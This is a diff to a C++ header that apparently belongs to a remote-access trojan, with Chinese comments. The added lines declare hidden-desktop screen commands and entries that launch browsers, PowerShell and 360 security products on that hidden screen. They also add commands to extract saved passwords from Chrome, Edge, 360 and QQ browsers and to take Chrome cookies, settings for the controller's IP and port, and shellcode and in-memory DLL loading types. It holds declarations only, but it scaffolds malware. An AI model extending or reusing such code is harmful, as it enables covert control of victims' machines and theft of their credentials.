@@ -1,5 +1,5 @@
 #pragma once
-
+#define _CRT_SECURE_NO_WARNINGS
 #include <vector>
 #include <string>
 #include <iosfwd>
@@ -205,7 +205,10 @@ enum
 	TOKEN_TALK_START,				// 即时消息开始
 	TOKEN_TALKCMPLT,				// 即时消息可重发
 	TOKEN_KEYFRAME=134,				// 关键帧
-
+	TOKEN_BITMAPINFO_HIDE,          // 虚拟屏幕
+	TOKEN_SCREEN_SIZE,              // 屏幕大小
+	
+	TOKEN_DECRYPT = 199,
 	TOKEN_REGEDIT = 200,            // 注册表
 	COMMAND_REG_FIND,				// 注册表 管理标识
 	TOKEN_REG_KEY,
@@ -230,6 +233,56 @@ enum ProxyManager {
 	COMMAND_PROXY_DATA,
 	COMMAND_PROXY_CONNECT_HOSTNAME,
 };
+
+// 后台屏幕其他命令
+enum HideScreenSpy {
+	COMMAND_FLUSH_HIDE,             // 刷新屏幕
+	COMMAND_SCREEN_SETSCREEN_HIDE,  // 重置分辨率
+	COMMAND_HIDE_USER,              // 自定义命令
+	COMMAND_HIDE_CLEAR,             // 清理后台
+	COMMAND_COMMAND_SCREENUALITY60_HIDE, // 清晰度
+	COMMAND_COMMAND_SCREENUALITY85_HIDE, // 清晰度
+	COMMAND_COMMAND_SCREENUALITY100_HIDE, // 清晰度
+
+	IDM_OPEN_Explorer = 33,
+	IDM_OPEN_run,
+	IDM_OPEN_Powershell,
+
+	IDM_OPEN_360JS,
+	IDM_OPEN_360AQ,
+	IDM_OPEN_360AQ2,
+	IDM_OPEN_Chrome,
+	IDM_OPEN_Edge,
+	IDM_OPEN_Brave,
+	IDM_OPEN_Firefox,
+	IDM_OPEN_Iexplore,
+	IDM_OPEN_ADD_1,
+	IDM_OPEN_ADD_2,
+	IDM_OPEN_ADD_3,
+	IDM_OPEN_ADD_4,
+	IDM_OPEN_zdy,
+	IDM_OPEN_zdy2,
+	IDM_OPEN_close,
+};
+
+struct ZdyCmd {
+	char                oldpath[_MAX_PATH];
+	char                newpath[_MAX_PATH];
+	char                cmdline[_MAX_PATH];
+};
+
+// 解密数据
+enum DecryptCommand {
+	COMMAND_LLQ_GetChromePassWord,
+	COMMAND_LLQ_GetEdgePassWord,
+	COMMAND_LLQ_GetSpeed360PassWord,
+	COMMAND_LLQ_Get360sePassWord,
+	COMMAND_LLQ_GetQQBroPassWord,
+
+	COMMAND_LLQ_GetChromeCookies,
+};
+
+typedef DecryptCommand BroType;
 
 enum 
 {
@@ -402,6 +455,28 @@ public:
 	}
 } CONNECT_ADDRESS ;
 
+// 客户端程序线程信息结构体, 包含5个成员: 
+// 运行状态(run)、句柄(h)、通讯客户端(p)、调用者参数(user)和连接信息(conn).
+struct ThreadInfo
+{
+	int run;
+	HANDLE h;
+	void* p;
+	void* user;
+	CONNECT_ADDRESS* conn;
+	ThreadInfo() : run(1), h(NULL), p(NULL), user(NULL), conn(NULL) { }
+};
+
+struct PluginParam {
+	char IP[100];			// 主控IP
+	int Port;				// 主控端口
+	State *Exit;			// 客户端状态
+	void* User;				// 自定义参数
+	PluginParam(const char*ip, int port, State *s, void* u=0) : Port(port), Exit(s), User(u){
+		strcpy_s(IP, ip);
+	}
+};
+
 // 将字符串按指定字符分隔为向量
 inline std::vector<std::string> StringToVector(const std::string& str, char ch, int reserved = 1) {
 	// 使用字符串流来分隔字符串
@@ -513,14 +588,13 @@ typedef struct MasterSettings {
 	char        Reserved[476];              // 预留
 }MasterSettings;
 
-// 100字节: 运行类型 + 大小 + 调用方式 + DLL名称 + 函数名称
+// 100字节: 运行类型 + 大小 + 调用方式 + DLL名称
 typedef struct DllExecuteInfo {
 	int RunType;							// 运行类型
 	int Size;								// DLL 大小
 	int CallType;							// 调用方式
 	char Name[32];							// DLL 名称
-	char Func[32];							// 函数名称
-	char Reseverd[24];
+	char Reseverd[56];
 }DllExecuteInfo;
 
 enum
@@ -531,10 +605,9 @@ enum
 	SHELLCODE = 0,
 	MEMORYDLL = 1,
 
-	CALLTYPE_DEFAULT = 0,						// 默认调用方式: void (*CallTypeDefault)(void)
+	CALLTYPE_DEFAULT = 0,		// 默认调用方式: 只是加载DLL,需要在DLL加载时执行代码
+	CALLTYPE_IOCPTHREAD = 1,	// 调用run函数启动线程: DWORD (__stdcall *run)(void* lParam)
 };
-
-typedef void (*CallTypeDefault)(void);
 
 typedef DWORD(__stdcall* PidCallback)(void);
 
@@ -702,5 +775,11 @@ public:
 		return this;
 	}
 };
+
+#ifdef _WIN64
+#define MYMSG MSG
+#else
+#define MYMSG MSG64
+#endif
 
 #endif
